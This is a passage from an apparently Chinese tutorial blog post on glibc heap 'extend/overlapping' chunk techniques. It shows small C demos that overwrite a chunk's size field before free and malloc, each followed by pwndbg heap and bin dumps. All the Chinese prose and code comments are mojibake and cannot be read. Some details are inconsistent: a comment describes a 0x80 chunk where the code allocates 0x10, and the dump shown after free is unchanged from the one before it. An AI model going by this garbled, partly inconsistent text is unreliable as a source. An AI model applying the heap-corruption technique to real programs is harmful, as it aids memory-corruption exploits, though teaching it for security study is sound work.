class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 3.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª0x80çš„chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//é¦–å…ˆè¿›è¡Œé‡Šæ”¾ï¼Œä½¿å¾—chunk1è¿›å…¥unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆæ˜¯ä¸¤æ¬¡ mallocï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51&lt;======Top Chunk</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åç›´æ¥ free æ‰ chunk1ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51&lt;======Top Chunk</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè¿˜æ˜¯èƒ½çœ‹å‡ºæ¥å­˜åœ¨ä¸¤ä¸ª chunk çš„ï¼Œå½“ä¿®æ”¹äº† size åŸŸå¤§å°åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹åŸæœ¬çš„ä¸‰ä¸ª chunk å˜æˆäº†ä¸¤ä¸ªï¼Œå¹¶ä¸” chunk2 è¿˜æ˜¯ allocated çŠ¶æ€ï¼Œé‡å ä¹‹åï¼Œchunk1 æ˜¯ free çŠ¶æ€ï¼Œæ‰€ä»¥æ•´ä¸ª chunk ä¾æ—§æ˜¯ free çŠ¶æ€ã€‚ä¹‹å malloc (0xa0) è¯•è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="4-extendå‰å‘overlapping"><a class="markdownIt-Anchor" href="#4-extendå‰å‘overlapping">#</a> 4ã€extend å‰å‘ overlappingï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 4.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬1ä¸ª 0x80 çš„chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬2ä¸ª 0x10 çš„chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬3ä¸ª 0x10 çš„chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬4ä¸ª 0x10 çš„chunk4    </span></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿˜æ˜¯è€æ ·å­ï¼Œè¿›è¡Œ 4 æ¬¡ mallocï¼Œçœ‹ä¸‹ heap å’Œ bin ä»¥åŠ chunk çš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000021&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021&lt;======Chunk3</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021&lt;======Chunk4</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81&lt;======Top Chunk</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åä¿®æ”¹ size åŸŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å freeï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000061</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åé‡æ–° mallocï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span 